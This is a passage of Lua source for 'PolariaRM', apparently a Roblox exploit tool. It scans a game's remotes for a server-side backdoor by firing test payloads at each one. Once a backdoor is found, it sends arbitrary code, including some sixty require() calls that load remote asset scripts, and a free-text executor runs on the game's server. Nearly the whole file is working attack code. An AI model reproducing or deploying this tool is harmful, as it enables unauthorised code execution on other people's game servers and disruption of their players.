    'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
}

local function generateName(lenght)
    local text = ''
    for i = 1, lenght do
        text = text .. alphabet[math.random(1, #alphabet)]
    end
    return text
end

local function runRemote(remote, data)
    if remote then
        local isRemoteEvent = expect("boolean", remote:IsA("RemoteEvent"), false)
        local isRemoteFunction = expect("boolean", remote:IsA("RemoteFunction"), false)
        
        if isRemoteEvent then
            local FireServer = expect("function", remote.FireServer, nil)
            if FireServer then
                FireServer(remote, data)
            end
        elseif isRemoteFunction then
            local InvokeServer = expect("function", remote.InvokeServer, nil)
            if InvokeServer then
                spawn(function() 
                    InvokeServer(remote, data)
                end)
            end
        end
    end
end

local function findRemote()
    ScanStatus.Text = "Scanning for backdoors..."
    
    local timee = os.clock()
    local remotes = {}
    local code
    
    local GetProductInfo = expect("function", MarketplaceService and MarketplaceService.GetProductInfo, nil)
    local gameName = "Unknown Game"
    if GetProductInfo then
        local success, info = pcall(function()
            return GetProductInfo(MarketplaceService, game.PlaceId)
        end)
        if success and info then
            gameName = info.Name
        end
    end
    
    local placeId = game.PlaceId
    local PlayerName = Player.Name
    local userId = Player.UserId
    local accountAge = Player.AccountAge
    
    local ReplicatedStorage = Services.ReplicatedStorage
    if ReplicatedStorage then
        local protected_backdoor = ReplicatedStorage:FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
        if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
            while true do
                code = generateName(math.random(12,30))
                if not remotes[code] then 
                    break 
                end
            end
            spawn(function() 
                local InvokeServer = expect("function", protected_backdoor.InvokeServer, nil)
                if InvokeServer then
                    InvokeServer(protected_backdoor, '.', "a=Instance.new('Model',workspace)a.Name='"..code.."'")
                end
            end)
            remotes[code] = protected_backdoor
        end
    end
    
    for i, remote in game:GetDescendants() do
        local isRemoteEvent = expect("boolean", remote:IsA("RemoteEvent"), false)
        local isRemoteFunction = expect("boolean", remote:IsA("RemoteFunction"), false)
        
        if not isRemoteEvent and not isRemoteFunction then 
            continue 
        end
        
        if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
            continue
        end
        
        if ReplicatedStorage and (remote.Parent == ReplicatedStorage or 
           remote.Parent.Parent == ReplicatedStorage or 
           remote.Parent.Parent.Parent == ReplicatedStorage) then
            
            if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
                continue
            end
            
            if remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
                continue
            end
            
            if remote.Parent and remote.Parent.Name == 'expectChatSystemChatEvents' then
                continue
            end
        end
        
        while true do
            code = generateName(math.random(12,30))
            if not remotes[code] then 
                break 
            end
        end
        
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end
    
    for i = 1, 100 do
        for code, remote in remotes do
            if workspace:FindFirstChild(code) then
                runRemote(remote, "require(171016405.1884*69)")
                
                backdoorRemote = remote
                ScanStatus.Text = "Backdoor found at: " .. remote:GetFullName()
                return remote
            end
        end
        wait()
    end
    
    ScanStatus.Text = "No backdoor found"
    return false
end

ScanBtn.MouseButton1Click:Connect(function()
    findRemote()
end)

local function CreateButton(name, code)
    local newButton = BtnExample:Clone()
    newButton.Name = name
    newButton.Visible = true
    newButton.Parent = ScriptsContent
    
    local label = newButton:FindFirstChild("BtnExampleLabel",true)
    if label then
        label.Text = name
    end
    
    newButton.MouseButton1Click:Connect(function()
        if backdoorRemote then
            runRemote(backdoorRemote, code)
        else
            local SetCore = expect("function", Services.StarterGui.SetCore, nil)
            if SetCore then
                SetCore(Services.StarterGui, "SendNotification", {
                    Title = "PolariaRM (Error)",
                    Text = "No backdoor found! Scan first.",
                    Icon = GetAsset("PolariaRM/Assets/polaria_logo.png"),
                    Duration = 3
                })
            end
        end
    end)
end

CreateButton("Horseman", "require(3737497650).load('" .. Player.Name .. "')")
CreateButton("The Hotline", "require(5813879549).load('" .. Player.Name .. "')")
CreateButton("Potato Man", "require(4618428149).load('" .. Player.Name .. "')")
CreateButton("Master Chief", "require(5812973403).Halo('" .. Player.Name .. "')")
CreateButton("Oculus", "require(5813695241).load('" .. Player.Name .. "')")
CreateButton("Hypercar", "require(5874393699).load('" .. Player.Name .. "')")
CreateButton("Neon Overlord", "require(5876551530).load('" .. Player.Name .. "')")
CreateButton("Clown Kidnap", "require(5591099977)('" .. Player.Name .. "')")
CreateButton("Thanos", "require(4920151387).load('" .. Player.Name .. "')")
CreateButton("The sun is a deadly lazer", "require(5751710030).Sun('" .. Player.Name .. "')")
CreateButton("Ying Yang", "require(4875966146).load('" .. Player.Name .. "')")
CreateButton("Titanium Runner", "require(5375511885).Player('" .. Player.Name .. "')")
CreateButton("Crypt", "require(5455352803).crypt('" .. Player.Name .. "')")
CreateButton("Rainbow Factory", "require(4823100870).HowRainbowsAreMade('" .. Player.Name .. "')")
CreateButton("Ares The Bladist", "require(5813806760).load('" .. Player.Name .. "')")
CreateButton("Visualizer", "require(5684993096).load('" .. Player.Name .. "')")
CreateButton("Hacker X", "require(5641200549).load('" .. Player.Name .. "')")
CreateButton("Fallen Angel", "require(4490557105).load('" .. Player.Name .. "')")
CreateButton("Dodge Charger", "require(4697572245).load('" .. Player.Name .. "')")
CreateButton("Soldier", "require(5177488826).Soldier('" .. Player.Name .. "')")
CreateButton("Grab Knife", "require(5516594078)('" .. Player.Name .. "')")
CreateButton("Pizza Guy", "require(4657036575).load('" .. Player.Name .. "')")
CreateButton("Darth Vader", "require(5441060212).load('" .. Player.Name .. "')")
CreateButton("Ban Hammer", "require(5448035802).Hammer('" .. Player.Name .. "', 'BanHammer')")
CreateButton("Crescendo", "require(4328810253).load('" .. Player.Name .. "')")
CreateButton("Hell Robotics", "require(5813792606).load('" .. Player.Name .. "')")
CreateButton("Cyber Knight", "require(5617200606).Cyber('" .. Player.Name .. "')")
CreateButton("Articulacy", "require(5730283203).Articulacy('" .. Player.Name .. "')")
CreateButton("Neptunian V", "require(4453491513).load('" .. Player.Name .. "')")
CreateButton("Obliterator", "require(5375491266).Player('" .. Player.Name .. "')")
CreateButton("Rainbow Stand", "require(5367599184).Dark('" .. Player.Name .. "')")
CreateButton("Tron Bike", "require(4021975182).load('" .. Player.Name .. "')")
CreateButton("Infinity Gauntlet", "require(5375537557).Dark('" .. Player.Name .. "')")
CreateButton("Templar", "require(5313663424).Dark('" .. Player.Name .. "')")
CreateButton("Baseball Bat", "require(4559977647).load('" .. Player.Name .. "')")
CreateButton("Dominus Venari", "require(3256686965).load('" .. Player.Name .. "')")
CreateButton("Blind Reaper", "require(4185644819).a('" .. Player.Name .. "')")
CreateButton("SCP 106", "require(4935275557):Subaru112('" .. Player.Name .. "', 'Subaru112's SCP-106')")
CreateButton("Dubstep Gun", "require(4442010059).load('" .. Player.Name .. "')")
CreateButton("Karambit", "require(5970744588).load('" .. Player.Name .. "')")
CreateButton("Infinite Yield", "require(13716575182)('" .. Player.Name .. "')")
CreateButton("Death Sheriff", "require(6056559552).load('" .. Player.Name .. "')")
CreateButton("Dominus Frigidus", "require(6054361648).load('" .. Player.Name .. "')")
CreateButton("Piano", "require(5983549520).load('" .. Player.Name .. "')")
CreateButton("Chat Control Gui", "require(5903403087).load('" .. Player.Name .. "')")
CreateButton("Echo", "require(5374597845).Dark('" .. Player.Name .. "')")
CreateButton("KFC", "require(3615713971).load('" .. Player.Name .. "')")
CreateButton("Legake Glove", "require(5187166380)('" .. Player.Name .. "')")
CreateButton("Chainsaw", "require(4560014954).load('" .. Player.Name .. "')")
CreateButton("Dark Eccentric Wrench", "require(5712519660).load('" .. Player.Name .. "')")
CreateButton("Alpha Gattling Gun", "require(5451379778).Gun('" .. Player.Name .. "')")
CreateButton("Frisk", "require(5849995364).load('" .. Player.Name .. "')")
CreateButton("Gentleman Killbot", "require(5430831931).Dark('" .. Player.Name .. "')")
CreateButton("Despacito Mech", "require(4105428725).load('" .. Player.Name .. "')")
CreateButton("Sirenhead", "require(5239955586).Dark('" .. Player.Name .. "')")
CreateButton("Lost Soul", "require(5390158029).Dark('" .. Player.Name .. "')")
CreateButton("Betty Noire", "require(5139373601).load('" .. Player.Name .. "')")
CreateButton("Hallow Slayer", "require(2675506369).hal('" .. Player.Name .. "')")
CreateButton("Skid Beater", "require(3530402272)('" .. Player.Name .. "')")
CreateButton("Chronos Sentinel", "require(3089107241).naenae('" .. Player.Name .. "')")
CreateButton("Pity Hub", "require(3253460334)('" .. Player.Name .. "')")

BtnExample:Destroy()

Exe.MouseButton1Click:Connect(function()
    local SetCore = expect("function", Services.StarterGui.SetCore, nil)
    if backdoorRemote and InputBox.Text ~= "" then
        runRemote(backdoorRemote, InputBox.Text)
    elseif not backdoorRemote and SetCore then
        SetCore(Services.StarterGui, "SendNotification", {
            Title = "PolariaRM (Error)",
            Text = "No backdoor found! Scan first.",
            Icon = GetAsset("PolariaRM/Assets/polaria_logo.png"),
            Duration = 3
        })
    end
end)

Clr.MouseButton1Click:Connect(function()
    InputBox.Text = ""
end)

Re.MouseButton1Click:Connect(function()
    local SetCore = expect("function", Services.StarterGui.SetCore, nil)
    local success, errorMsg = pcall(function()
        if backdoorRemote then
            local TARGET_USERNAME = Player.Name
            
            local RefreshScript = [[
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local Players = game:GetService("Players")
                local TARGET_USERNAME = "]] .. TARGET_USERNAME .. [["
                
                local refreshRemote
                if not ReplicatedStorage:FindFirstChild("RefreshCharacterRemote") then
                    refreshRemote = Instance.new("RemoteEvent")
                    refreshRemote.Name = "RefreshCharacterRemote"
                    refreshRemote.Parent = ReplicatedStorage
                else
                    refreshRemote = ReplicatedStorage:FindFirstChild("RefreshCharacterRemote")
                end
                
                refreshRemote.OnServerEvent:Connect(function(Player)
                    if Player.Name == TARGET_USERNAME then
                        Player:LoadCharacter()
                    end
                end)
                
                local function handleExistingPlayer(Player)
                    if Player.Name == TARGET_USERNAME then
                        task.wait(0.5)
                        Player:LoadCharacter()
                    end
                end
                
                for _, Player in ipairs(Players:GetPlayers()) do
                    handleExistingPlayer(Player)
                end
                
                Players.PlayerAdded:Connect(handleExistingPlayer)
            ]]
            
            runRemote(backdoorRemote, RefreshScript)
        elseif SetCore then
            SetCore(Services.StarterGui, "SendNotification", {
                Title = "PolariaRM (Error)",
                Text = "No backdoor found! Scan first.",
                Icon = GetAsset("PolariaRM/Assets/polaria_logo.png"),
                Duration = 3
            })
        end
    end)
    
    if not success and SetCore then
        SetCore(Services.StarterGui, "SendNotification", {
            Title = "PolariaRM (Error)",
            Text = "Failed to execute: " .. tostring(errorMsg),
            Icon = GetAsset("PolariaRM/Assets/polaria_logo.png"),
            Duration = 3
        })
    end
end)